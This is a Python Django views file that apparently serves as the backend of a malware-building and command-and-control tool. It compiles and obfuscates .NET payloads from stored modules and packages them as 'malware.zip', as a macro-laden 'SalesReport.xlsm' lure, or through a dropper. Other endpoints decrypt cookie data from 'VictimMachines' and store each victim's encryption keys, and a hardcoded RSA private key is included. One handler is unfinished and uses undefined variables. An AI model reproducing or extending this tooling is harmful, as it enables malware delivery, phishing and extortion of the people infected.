from pydoc import plain
from django.http.response import HttpResponse
from django.shortcuts import render
import os
import re
import subprocess
from rest_framework.decorators import api_view, permission_classes
from rest_framework.response import Response
from rest_framework import status
import json
from .models import ClassCode,VictimMachines
from Crypto.Cipher import AES
import base64
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto import Random
import json
from django.http import FileResponse
import shutil
import openpyxl
import random
import string
from .serializers import ClassCodeSerializer
# Create your views here.
"""
@api_view(["POST"])
def Analyzer(request):
    data = json.loads(request.body.decode("utf-8"))
    folder = data["folder"]
    dotnets = []
    files = [f for f in os.listdir(folder) if f.endswith(".exe")]
    print("------------------------------------------------------------------")
    for file in files:
        stream = os.popen(".\\Scripts\\diec.exe -d {}".format(folder + "\\" + file))
        output = stream.readlines()
        for o in output:
            print(o, end="")
            if "library: .NET" in o:
                dotnets.append(file)
        os.popen(".\\Scripts\\diec.exe -e {}".format(folder + "\\" + file))
        print("------------------------------------------------------------------\n")
    for dotnet in dotnets:
        malware = Malware.objects.create(name=dotnet)
        stream = os.popen(".\\Scripts\\diec.exe -e {}".format(folder + "\\" + file))
        output = stream.readlines()
        print(dotnet)
        for line in output[1:]:
            print(line)
            entropy = line.split("|")
            EntropySection.objects.create(
                malware=malware,
                name=entropy[1],
                offset=entropy[2],
                size=entropy[3],
                entropy=float(entropy[4].split(" ")[0][:-1]),
                status=entropy[4].split(" ")[1],
            )
        proc = subprocess.Popen(
            ["powershell", ".\Scripts\Demo.ps1 {}".format(folder + "\\" + dotnet)],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
        lines = proc.stdout.read().decode("utf-8")
        classes = re.split("@class@", lines)
        for c in classes:
            ClassCode.objects.create(malware=malware, code=c)
    return Response(status=status.HTTP_200_OK)
"""

@api_view(["GET"])
def getModules(request):
    modules = ClassCode.objects.all()
    serializer = ClassCodeSerializer(modules, many=True)
    return Response(
        serializer.data,
    )

def cleanse(data):
    temp = []
    int_string = ""
    for i in range(len(data)):
        if(data[i].isdigit()):
         int_string = int_string + data[i] 
        else:
            if(int_string != ""):
                int_string = int(int_string)
                temp.append(int_string)
                int_string = ""
    temp.append(int(int_string))
    return temp
@api_view(["GET"])
def GetDataWithPPEnc(request):
    cookie = request.headers.get("Cookie")
    cookies = cookie.split("&")


    data = cookies[0]
    data = bytes(cleanse(data))

    encrypted_key = cookies[1]
    encrypted_key = bytes(cleanse(encrypted_key))

    
    encrypted_iv = cookies[2]
    encrypted_iv = encrypted_iv[0:-1]
    encrypted_iv = bytes(cleanse(encrypted_iv))
   

    N = 26004126751443262055682011081007404548850063543219588539086190001742195632834884763548378850634989264309169823030784372770378521274048211537270851954737597964394738860810397764157069391719551179298507244962912383723776384386127059976543327113777072990654810746825378287761304202032439750301912045623786736128233730798303406858144431081065384988539277630625160727011582345942687126935423502995613920211095965452425548919926951203151483590222152446516520421379279591807660810550784744188433550335950652666201439521115515355539373928576162221297645781251953236644092963307595988040539993067709240004782161131243282208593
    E = 65537
    D = 844954574014654722486150458473919587206863455991060222377955072839922571984098861772377020041002939383041291761051853484512886782322743892284027026528735139923685801975918062144627908962369108081178131103781404720078456605432924519279933702927938064507063482999903002331319671303661755165294744970869186178561527578261522199503340027952798084625109041630166309505066404215223685733585467434168146932177924040219720383860880583466676764286302300281603021045351842170755190359364339936360197909582974922675680101321863304283607829144759777189360340512230537108705852116021758740440195445732631657876008160876867027543

    private_key = RSA.construct((N, E, D))


    cipher = PKCS1_v1_5.new(private_key)

    random_generator = Random.new().read
    sentinel = random_generator(20)
    key = cipher.decrypt(encrypted_key, sentinel)

    iv = cipher.decrypt(encrypted_iv, sentinel)
    
    aes = AES.new(key, AES.MODE_CBC, iv=iv)
    plaintext = aes.decrypt(data).decode("utf-8")

    plaintext = plaintext[:plaintext.rfind('}')+1]
    data = json.loads(plaintext)
    print(data)
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')

    if x_forwarded_for:
        ip_address = x_forwarded_for.split(',')[0]
    else:
        ip_address = request.META.get('REMOTE_ADDR')

    secret_key =  data['secret_key'] if "secret_key" in data else ""
    if VictimMachines.objects.filter(ip_address=ip_address).exists():
        victim = VictimMachines.objects.get(ip_address=ip_address)
        victim.aes_communnication_iv = str(iv)
        victim.aes_communnication_key = str(key)
        victim.encryption_secret_key = secret_key
        victim.save()
    else:
        
        VictimMachines.objects.create(
            ip_address=ip_address,
            aes_communnication_key=str(key),
            aes_communnication_iv=str(iv),
            encryption_secret_key=secret_key
        )
    return Response(status=status.HTTP_200_OK)

@api_view(["GET"])
def GetDataWithXOR(request):
    cookie = request.headers.get("Cookie")
    cookies = cookie.split("&")

    data = cookies[0]
    print(cleanse(data))
    data = bytes(cleanse(data))

    XORed_key = cookies[1]
    XORed_key = bytes(cleanse(XORed_key))

    
    XORed_iv = cookies[2]
    XORed_iv = XORed_iv[0:-1]
    XORed_iv = bytes(cleanse(XORed_iv))

    #Reverse XOR Here...
    # key =
    # iv = 

    
    """aes = AES.new(key, AES.MODE_CBC, iv=iv)
    plaintext = aes.decrypt(data).decode("utf-8")[:-4]
    data = json.loads(plaintext)

    print(data)"""

    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip_address = x_forwarded_for.split(',')[0]
    else:
        ip_address = request.META.get('REMOTE_ADDR')

    secret_key =  data['secret_key'] if data["secret_key"] else ""
    if VictimMachines.objects.filter(ip_address=ip_address).exists():
        victim = VictimMachines.objects.get(ip_address=ip_address)
        victim.aes_communnication_iv = str(iv)
        victim.aes_communnication_key = str(key)
        victim.encryption_secret_key = secret_key
        victim.save()
    else:
        VictimMachines.objects.create(
            ip_address=ip_address,
            aes_communnication_key=str(key),
            aes_communnication_iv=str(iv),
            encryption_secret_key=secret_key
        )
         
    return Response(status=status.HTTP_200_OK)






@api_view(["POST"])
def GenerateDotnet48(request):
    csprojTemplate = '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup><OutputType>Exe</OutputType><TargetFramework>netframework4.8</TargetFramework></PropertyGroup></Project>'
    sources = []
    data = request.data

    for module in data["modules"]:
        source = ClassCode.objects.get(id=module["id"])
        sources.append(source)
    path = ".\\Scripts\\DotnetProject"
    i = 1

    for fname in os.listdir(path):
        if fname.startswith("source"):
            os.remove(os.path.join(path, fname))
    f = open(os.path.join(path, "DotnetProject.csproj"), "w")
    f.write(csprojTemplate)
    f.close()
    if("obfuscator" in data and data["obfuscator"] is not None):
        if(data["obfuscator"] is "Eazfuscator/Eazfuscator.NET.exe"):
            command = ".\Scripts\Eazfuscator\Eazfuscator.NET.exe --msbuild-project-path .\Scripts\DotnetProject\DotnetProject.csproj --protect-project"
            proc = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print(proc.returncode)
                print(stdout.decode("utf-8", "replace"))
                return Response(status=status.HTTP_400_BAD_REQUEST)
    for source in sources:
        f2 = open(os.path.join(path, "source{}.cs".format(i)), "w", encoding="utf-8")
        code = source.code.replace("\n","")
        f2.write(code)
        f2.close()
        i += 1
        for package in source.packageDependincies.all():
            proc = subprocess.Popen(
                "dotnet add package {}".format(package.package),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=path,
            )
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print(stdout.decode("utf-8", "replace"))
                return Response(status=status.HTTP_400_BAD_REQUEST)
        for reference in source.referenceDependincies.all():
            proc = subprocess.Popen(
                "dotnet add reference ..\Libraries\{}".format(reference.package),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=path,
            )
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print(stdout.decode("utf-8", "replace"))
                return Response(status=status.HTTP_400_BAD_REQUEST)
    command = "dotnet build --configuration Release"
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=path,
    )
    malware_path = os.path.join(path,"bin\Release\\netframework4.8")
    stdout, stderr = proc.communicate()
    if proc.returncode != 0:
        print(stdout.decode("utf-8", "replace"))
        return Response(status=status.HTTP_400_BAD_REQUEST)
    dlls = [f for f in os.listdir(malware_path) if f.endswith('.dll')]
    ilmergerPath = os.path.join(os.environ['USERPROFILE'],".nuget\packages\ilmerge\\3.0.41\\tools\\net452\ILMerge.exe")
    command = "{} bin\Release\\netframework4.8\DotnetProject.exe /lib:bin\Release\\netframework4.8 /out:final\DotnetProject.exe".format(ilmergerPath)
    for dll in dlls:
        command += " " + dll
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=path,
    )
    stdout, stderr = proc.communicate()
    mergeFailed=False
    if proc.returncode != 0:
        print(stdout.decode("utf-8", "replace"))
        mergeFailed = True

    if(not mergeFailed):
        malware_path = os.path.join(path,"final")
    #if("obfuscator" in data and data["obfuscator"] is not None and data["obfuscator"] is not ""):
    #    command = ".\Scripts\{} {}\DotnetProject.exe".format(data["obfuscator"],malware_path)
    #    proc = subprocess.Popen(
    #        command,
    #        stdout=subprocess.PIPE,
    #        stderr=subprocess.PIPE,
    #    )
    #    stdout, stderr = proc.communicate()
    #    if proc.returncode != 0:
    #        print(proc.returncode)
    #        print(stdout.decode("utf-8", "replace"))
    #        return Response(status=status.HTTP_400_BAD_REQUEST)
    if("method" in data and data["method"] is not None and data["method"] != ""):
        if(mergeFailed):
            print("Cannot generate url")
        else:
            randomName = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
            shutil.copyfile(os.path.join(malware_path,"DotnetProject.exe"), "./static/executable/{}.exe".format(randomName))
            if(data["method"] == "vba"):
                wb = openpyxl.load_workbook(filename = 'SalesReport.xlsm', read_only = False, keep_vba = True)
                sheet = wb['Sayfa1']
                sheet["A1"] = randomName
                wb.save('SalesReport.xlsm')
                wb.close()
                vba_file = open("SalesReport.xlsm","rb")
                response = FileResponse(vba_file,filename="SalesReport.xlsm",as_attachment=True)
                return response
            if data["method"].startswith("dropper"):
                extension = data["method"].split(' ')[1]
                command = ".\Scripts\TheDropper\TheDropper.exe http://localhost:8000/executable/{}.exe {}".format(randomName, extension)
                proc = subprocess.Popen(
                    command,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                )
                stdout, stderr = proc.communicate()
                if proc.returncode != 0:
                    print(proc.returncode)
                    print(stdout.decode("utf-8", "replace"))
                    return Response(status=status.HTTP_400_BAD_REQUEST)
                for file in os.listdir():
                    if file.endswith(extension):
                        file_input = open(file,"rb")
                        response = FileResponse(file_input,filename=file)
                        return response

    shutil.make_archive("malware", "zip", malware_path)
    zip_file = open("malware.zip", "rb")
    response = FileResponse(zip_file,filename="malware.zip")
    return response
@api_view(["POST"])
def GenerateDotnet5(request):
    csprojTemplate = '<Project Sdk="Microsoft.NET.Sdk">\n\t<PropertyGroup>\n\t<OutputType>Exe</OutputType>\n\t\t<TargetFramework>net5.0</TargetFramework>\n\t</PropertyGroup>\n</Project>' 
    sources = []
    data = request.data
    print(data)
    for module in data["modules"]:
        source = ClassCode.objects.get(id=module["id"])
        sources.append(source)
    path = ".\\Scripts\\DotnetProject"
    i = 1

    for fname in os.listdir(path):
        if fname.startswith("source"):
            os.remove(os.path.join(path, fname))
    f = open(os.path.join(path, "DotnetProject.csproj"), "w")
    f.write(csprojTemplate)
    f.close()
    if("obfuscator" in data and data["obfuscator"] is not None):
        if(data["obfuscator"] is "Eazfuscator/Eazfuscator.NET.exe"):
            command = ".\Scripts\Eazfuscator\Eazfuscator.NET.exe --msbuild-project-path .\Scripts\DotnetProject\DotnetProject.csproj --protect-project"
            proc = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print(proc.returncode)
                print(stdout.decode("utf-8", "replace"))
                return Response(status=status.HTTP_400_BAD_REQUEST)
    for source in sources:
        f2 = open(os.path.join(path, "source{}.cs".format(i)), "w", encoding="utf-8")
        code = source.code.replace("\n","")
        f2.write(code)
        f2.close()
        i += 1
        for package in source.packageDependincies.all():
            proc = subprocess.Popen(
                "dotnet add package {}".format(package.package),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=path,
            )
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print(stdout.decode("utf-8", "replace"))
                return Response(status=status.HTTP_400_BAD_REQUEST)
        for reference in source.referenceDependincies.all():
            proc = subprocess.Popen(
                "dotnet add reference ..\Libraries\{}".format(reference.package),
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                cwd=path,
            )
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print(stdout.decode("utf-8", "replace"))
                return Response(status=status.HTTP_400_BAD_REQUEST)

    command = "dotnet publish -r win-x64 -p:PublishSingleFile=true --self-contained false -c Release -o final"
    proc = subprocess.Popen(
        command,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=path,
    )
    stdout, stderr = proc.communicate()
    if proc.returncode != 0:
        print(stdout.decode("utf-8", "replace"))
        return Response(status=status.HTTP_400_BAD_REQUEST)
    
    malware_path = os.path.join(path,"final")
    #if("obfuscator" in data and data["obfuscator"] is not None and data["obfuscator"] is not ""):
    #    command = ".\Scripts\{} {}\DotnetProject.exe".format(data["obfuscator"],malware_path)
    #    proc = subprocess.Popen(
    #        command,
    #        stdout=subprocess.PIPE,
    #        stderr=subprocess.PIPE,
    #    )
    #    stdout, stderr = proc.communicate()
    #    if proc.returncode != 0:
    #        print(proc.returncode)
    #        print(stdout.decode("utf-8", "replace"))
    #        return Response(status=status.HTTP_400_BAD_REQUEST)
    if("method" in data and data["method"] is not None and data["method"] != ""):
        randomName = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
        shutil.copyfile(os.path.join(malware_path,"DotnetProject.exe"), "./static/executable/{}.exe".format(randomName))
        if(data["method"] == "vba"):
            wb = openpyxl.load_workbook(filename = 'SalesReport.xlsm', read_only = False, keep_vba = True)
            sheet = wb['Sayfa1']
            sheet["A1"] = randomName
            wb.save('SalesReport.xlsm')
            wb.close()
            vba_file = open("SalesReport.xlsm","rb")
            response = FileResponse(vba_file,filename="SalesReport.xlsm")
            return response
        if data["method"].startswith("dropper"):
            extension = data["method"].split(' ')[1]
            command = ".\Scripts\TheDropper\TheDropper.exe http://localhost:8000/executable/{}.exe {}".format(randomName, extension)
            proc = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )
            stdout, stderr = proc.communicate()
            if proc.returncode != 0:
                print(proc.returncode)
                print(stdout.decode("utf-8", "replace"))
                return Response(status=status.HTTP_400_BAD_REQUEST)
            for file in os.listdir():
                if file.endswith(extension):
                    file_input = open(file,"rb")
                    response = FileResponse(file_input,filename=file)
                    return response

    shutil.make_archive("malware", "zip", malware_path,"DotnetProject.exe")
    zip_file = open("malware.zip", "rb")
    response = FileResponse(zip_file,filename="malware.zip")
    return response
